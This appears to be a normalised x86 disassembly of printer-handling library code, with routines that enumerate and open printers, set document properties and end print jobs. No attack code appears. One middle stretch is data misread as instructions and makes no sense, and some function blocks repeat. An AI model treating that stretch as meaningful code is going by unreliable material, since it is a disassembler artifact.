mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42375f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403fb0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423766
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049d8
lea eax [ ebp - 0x10 ]
call sub_405598
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_4220d0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4055b0
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_423784
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_423863
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fb0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42386a
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049d8
lea eax [ ebp - 0x8 ]
call sub_405598
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_4220d0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055b0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_423884
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40560c
xor eax eax
push ebp
push sub_4238d3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4055b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4238da
lea eax [ ebx + 0xc ]
call sub_405598
sub_4238e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40440c
xor eax eax
push ebp
push sub_423975
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403fb0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42366c
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42397c
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax ebx
call sub_423180
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_4231b0
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_423350
sub_4239a0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4220d0
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4220d0
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413808
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4220d0
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_413808
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_413808
sub_423a2c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_423140
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403224
mov eax [ esi + 0x14 ]
call sub_403224
mov eax [ esi + 0x10 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405598
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_423a80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423ab7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423abe
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_423ae8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423b0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423b14
retn
sub_423b24
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
cmp eax [ edx ]
or al 0x0
add [ eax ] al
in al 0x6d
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax ] cl
inc ebp
push eax
jb r-xdata
imul ebp [ esi + 0x74 ] 0x56907265
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
outsb
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
jb r-xdata
jb r-xdata
cmp [ edx ] 0x20
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
0x1000423c 0x0
outsb
je r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_423b14
retn
inc eax
inc edx
mov esi edx
jmp r-xdata
retn 0x8
outsb
je r-xdata
add [ eax + 0x54004010 ] ah
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
or al 0x0
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1000423c ] bl
add [ eax ] al
jb r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
pop ebp
jb r-xdata
add ah al
cmp eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ ebx ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
cmp eax [ edx ]
xor [ eax ] al
add [ eax ] al
mov al [ 0x54004010 ]
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add ah cl
cmp eax 0xe0042
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
or [ eax + edx * 2 + 0x72 ] dl
imul ebp [ esi + 0x74 ] 0x408d7265
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
call sub_404154
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
mov eax edi
pop edi
pop esi
pop ebx
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_423d7f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404154
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404368
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031f4
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404154
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404154
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_403530
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d86
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404154
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404368
je r-xdata
sub_423be0
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_423cac
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031f4
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404154
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404154
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_404154
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_423d0c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_423d7f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404154
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404368
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d86
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404154
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404368
je r-xdata
sub_423d90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031f4
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_423dcc
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_423e48
mov eax esi
call sub_42483c
mov eax esi
call sub_424878
mov eax [ esi + 0x4 ]
call sub_403224
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_423fe4
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
push eax
call GlobalUnlock
mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_423e48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_423f66
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f6d
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_423f74
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_41d5b0
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi CreateICA
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_4243e4
push eax
mov eax esi
call sub_4243fc
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_40441c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40441c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40441c
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_41d5b0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x8 ]
call sub_423c14
mov edi CreateDCA
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_41d5b0
sub_423f74
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_423fd9
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423fe0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x8 ]
call sub_423c14
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x4 ]
call sub_423c14
jmp r-xdata
sub_423fe4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_423f74
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_424018
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4243e4
push eax
mov eax ebx
call sub_4243fc
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_40441c
mov edx eax
mov eax edi
call sub_4084b8
mov eax [ esi + 0x4 ]
call sub_40441c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4084b8
mov eax [ esi + 0xc ]
call sub_40441c
mov edx eax
mov eax [ ebp + 0xc ]
call sub_4084b8
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_424084
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_4240c0
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4242f7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_423f74
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_424878
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_424084
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_423e48
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_4243fc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_423cac
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_408b70
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_404154
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4242fe
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_403f80
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_423d0c
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_424084
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_424308
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42435f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4243e4
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
movsx eax [ eax + 0x36 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424366
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x4 ]
call sub_423c14
sub_42436c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4243d6
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_423f74
mov eax ebx
call sub_4243e4
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
xor edx edx
mov eax ebx
call sub_423e48
mov eax [ ebx + 0x24 ]
mov [ eax + 0x36 ] si
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4243dd
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x4 ]
call sub_423c14
sub_4243fc
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42462b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_4245e8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026bc
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4245d7
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424632
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403f80
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4026dc
retn
inc eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_423be0
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_423cac
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_404154
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_423cac
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_408b70
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_423be0
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_42463c
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424819
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4079c0
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4247d9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
